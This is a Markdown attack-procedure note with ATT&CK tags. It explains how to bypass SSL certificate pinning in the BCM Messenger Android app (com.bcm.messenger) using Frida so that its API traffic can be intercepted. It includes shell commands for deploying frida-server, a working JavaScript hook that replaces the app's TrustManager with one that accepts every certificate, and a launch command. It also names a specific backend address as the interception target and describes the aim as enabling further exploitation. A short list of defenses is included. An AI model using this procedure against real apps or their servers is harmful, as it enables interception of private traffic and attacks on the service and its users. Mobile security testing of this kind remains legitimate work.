---
id: proc-uuid-001
tags:
  - ssl-pinning-bypass
  - android
  - frida
type: procedure
tools:
  - '[[tools/Frida]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Use Alternate Authentication Material]]'
updated_at: '2025-12-14T17:32:20.928Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques:
  - '[[Application Access Token]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Use Alternate Authentication Material]]'
---
# Bypass-SSL-Pinning-in-Android-App-with-Frida

## Summary

This procedure uses Frida to dynamically instrument the BCM Messenger Android app, hooking into SSL certificate validation functions to disable pinning and enable interception of HTTP traffic in cleartext.

## Description

In the context of exploiting the BCM Messenger app (package: com.bcm.messenger), SSL pinning prevents man-in-the-middle analysis. By injecting Frida scripts, attackers can override trust managers and certificate checks, allowing tools like mitmproxy to capture API calls to unprotected endpoints. This reveals the S3 upload mechanism without encryption or tokens. Prerequisites include a rooted Android device/emulator and the app installed.

## Requirements

1. Rooted Android device or emulator (e.g., Genymotion with root)
2. Frida server installed and running on the device (frida-server binary matching client version)
3. BCM Messenger app installed via APK or Play Store
4. USB debugging enabled for adb connection
5. Network proxy setup (e.g., mitmproxy) for traffic capture

## Defense

Defensive measures and detection strategies:

- Implement certificate pinning with runtime checks and app hardening (e.g., ProGuard obfuscation)
- Monitor for Frida processes or hooks via runtime integrity checks (e.g., SafetyNet API)
- Log anomalous traffic patterns or bypassed SSL attempts on the server side

## Objectives

1. Disable SSL pinning to access cleartext API traffic
2. Intercept requests to identify vulnerable endpoints
3. Enable further exploitation without encryption barriers

## Instructions

### Step 1: Setup Frida Environment

**Context**: Connect to the Android device and launch Frida server to prepare for app injection.

Install Frida tools on your host machine and push the server to the device.

```bash
pip install frida-tools
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

> This starts the Frida server in the background. Verify with `frida-ps -U` to list processes.

### Step 2: Inject Hook Script

**Context**: Write and load a JavaScript hook to bypass SSL validation in the app's TrustManager.

Create a Frida script (e.g., bypass.js) targeting common pinning implementations:

```javascript
Java.perform(function () {
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    var TrustManagerImpl = Java.registerClass({
        name: 'com.example.TrustManagerImpl',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function () {},
            checkServerTrusted: function () {},
            getAcceptedIssuers: function () { return []; }
        }
    });

    var trustManagers = [TrustManagerImpl.$new()];
    var sslContext = SSLContext.getInstance("TLS");
    sslContext.init(null, trustManagers, null);
    SSLContext.setDefault(sslContext);
});
```

Load the script into the running app:

```bash
frida -U -f com.bcm.messenger -l bypass.js --no-pause
```

> Successful injection logs 'Spawned com.bcm.messenger' and hooks are active. Now route app traffic through a proxy to trace requests.

### Step 3: Verify Bypass

**Context**: Test by triggering app network activity and confirming cleartext capture.

Launch the app, perform actions like profile upload, and check proxy logs for unencrypted HTTP to http://47.52.75.65:8080.

**Expected Output**: API requests visible without SSL errors, including JSON responses with S3 data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Use Alternate Authentication Material]]

### Sub-Techniques

- [[Application Access Token]]

## Commands Used


## Tools Used

- [[tools/Frida]]

## Tags

- ssl-pinning-bypass
- android
- mobile
- instrumentation
